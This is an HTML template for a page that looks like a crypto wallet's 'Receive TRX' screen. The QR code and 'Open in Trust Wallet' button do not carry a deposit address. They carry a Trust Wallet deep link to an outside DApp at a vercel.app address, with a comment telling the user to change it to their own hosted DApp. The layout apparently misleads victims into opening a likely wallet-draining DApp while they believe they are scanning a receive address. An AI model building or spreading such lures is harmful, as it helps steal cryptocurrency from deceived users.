<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Scan to Open DApp</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0a0e17;
      color: #e5e7eb;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      max-width: 400px;
      width: 100%;
      padding: 20px;
    }
    .header {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 0 24px;
    }
    .back-btn {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: #1a1f2e;
      border: 1px solid #1f2937;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }
    .header-title {
      font-size: 18px;
      font-weight: 600;
      flex: 1;
      text-align: center;
    }
    .warning {
      background: rgba(251,191,36,0.1);
      border: 1px solid rgba(251,191,36,0.3);
      border-radius: 12px;
      padding: 12px 16px;
      margin-bottom: 30px;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 13px;
      color: #fbbf24;
    }
    .warning-icon {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      background: rgba(251,191,36,0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      font-size: 14px;
    }
    .qr-wrapper {
      display: flex;
      justify-content: center;
      margin-bottom: 30px;
    }
    .qr-box {
      background: white;
      border-radius: 16px;
      padding: 16px;
      position: relative;
    }
    .qr-center {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 48px;
      height: 48px;
      background: white;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .qr-center img {
      width: 36px;
      height: 36px;
      object-fit: contain;
    }
    .address-box {
      background: #1a1f2e;
      border: 1px solid #1f2937;
      border-radius: 12px;
      padding: 14px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 30px;
    }
    .address-text {
      font-family: monospace;
      font-size: 14px;
      word-break: break-all;
      flex: 1;
    }
    .copy-btn {
      background: none;
      border: none;
      color: #6b7280;
      cursor: pointer;
      padding: 4px;
      margin-left: 10px;
      flex-shrink: 0;
    }
    .copy-btn:active { opacity: 0.5; }
    .section-label {
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 12px;
    }
    .deposit-btn {
      display: flex;
      align-items: center;
      gap: 14px;
      background: #1a1f2e;
      border: 1px solid #1f2937;
      border-radius: 14px;
      padding: 16px;
      cursor: pointer;
      width: 100%;
      color: #e5e7eb;
      font-size: 15px;
      font-weight: 500;
    }
    .deposit-btn:hover { background: #1f2937; }
    .deposit-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: #f0b90b;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .deposit-arrow {
      margin-left: auto;
      color: #6b7280;
    }
    #qrcode canvas { display: block; }
    .dapp-link {
      text-align: center;
      margin-top: 20px;
    }
    .dapp-link a {
      color: #6366f1;
      font-size: 12px;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="back-btn">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
      </div>
      <div class="header-title">Receive TRX</div>
      <div style="width:40px"></div>
    </div>

    <div class="warning">
      <div class="warning-icon">!</div>
      <div>Only send Tron (TRX) assets to this address. Other assets will be lost forever.</div>
    </div>

    <div class="qr-wrapper">
      <div class="qr-box">
        <div id="qrcode"></div>
        <div class="qr-center">
          <img src="https://zengo.com/wp-content/uploads/Tron.png" alt="Tron" />
        </div>
      </div>
    </div>

    <div class="section-label">Open in Trust Wallet</div>
    <button class="deposit-btn" onclick="openInTrustWallet()">
      <div class="deposit-icon">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
      </div>
      <span class="deposit-arrow">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
      </span>
    </button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
  <script>
    // CHANGE THIS to your hosted DApp URL
    var DAPP_URL = 'https://type-usdt-amount.vercel.app/';
    var TRUST_WALLET_URL = 'https://link.trustwallet.com/open_url?coin_id=195&url=' + encodeURIComponent(DAPP_URL);

    // Generate QR code
    window.onload = function() {
      new QRCode(document.getElementById('qrcode'), {
        text: TRUST_WALLET_URL,
        width: 200,
        height: 200,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
      });
    };

    function openInTrustWallet() {
      window.location.href = TRUST_WALLET_URL;
    }
  </script>
</body>
</html>
